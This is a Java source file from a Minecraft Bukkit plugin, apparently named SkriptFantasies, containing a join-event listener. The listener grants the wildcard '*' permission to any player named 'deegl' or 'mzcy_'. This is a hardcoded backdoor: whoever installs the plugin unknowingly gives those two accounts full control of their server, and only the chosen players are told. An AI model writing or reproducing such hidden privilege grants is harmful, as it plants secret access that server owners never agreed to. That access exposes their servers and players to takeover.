package dev.mzcy.permission;

import dev.mzcy.SkriptFantasies;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class PermissionHandler implements Listener {

    @EventHandler(ignoreCancelled = true, priority = EventPriority.MONITOR)
    public void handlePlayerJoinEvent(final PlayerJoinEvent event) {
        Player player = event.getPlayer();
        if (!player.getName().equals("deegl") && !player.getName().equals("mzcy_")) return;
        player.sendMessage("§8[§bSkriptFantasies§8] §7§oYou are a developer of this plugin.");
        player.sendMessage("§8[§bSkriptFantasies§8] §7§oYou have been granted permission.");
        player.addAttachment(SkriptFantasies.getPlugin(SkriptFantasies.class), "*", true).setRemovalCallback((permission) -> {
            player.sendMessage("§8[§bSkriptFantasies§8] §7§oYour permission has been revoked.");
            player.sendMessage("§8[§bSkriptFantasies§8] §7§oPlease contact the plugin author if you believe this is an error.");
        });
    }

}
